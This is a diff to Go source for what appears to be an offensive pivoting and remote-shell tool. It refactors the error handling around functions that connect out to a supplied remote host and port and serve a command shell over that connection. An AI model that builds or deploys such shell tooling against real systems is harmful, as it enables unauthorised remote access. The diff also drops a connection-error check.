@@ -75,7 +75,7 @@ func pivot(args map[string]commando.ArgValue, flags map[string]commando.FlagValu
 	}
 }
 
-func initiateShellConnection(args map[string]commando.ArgValue) (net.Conn, error) {
+func initiateShellConnection(args map[string]commando.ArgValue) net.Conn {
 	// Establish Connection
 	targetAddress := args["rhost"].Value
 	targetPort := args["rport"].Value
@@ -84,7 +84,7 @@ func initiateShellConnection(args map[string]commando.ArgValue) (net.Conn, error
 	if err == nil {
 		fmt.Printf("Connection established with %s\n", targetAddress)
 	}
-	return conn, err
+	return conn
 }
 
 func createShell(conn net.Conn) func(string){
@@ -112,7 +112,6 @@ func createShell(conn net.Conn) func(string){
 		    }
 		    // Change the directory and return the error.
 		    err := os.Chdir(args[1])
-		    check(err)
 		    if err != nil {
 		    	conn.Write([]byte(err.Error() + "\n"))
 		    }
@@ -150,9 +149,6 @@ func getShellPrompt() string {
 
 		currentWorkingDirectory, err := os.Getwd()
 		check(err)
-	    if err != nil {
-	        log.Fatal(err)
-	    }
 
 		if len(currentWorkingDirectory) > 0 {
 			prompt = currentWorkingDirectory + prompt
@@ -163,8 +159,7 @@ func getShellPrompt() string {
 
 func shell(args map[string]commando.ArgValue, flags map[string]commando.FlagValue) {
 	// Initiate Connection
-	conn, err := initiateShellConnection(args)
-	check(err)
+	conn := initiateShellConnection(args)
 	defer conn.Close()
 
 	// Create Shell
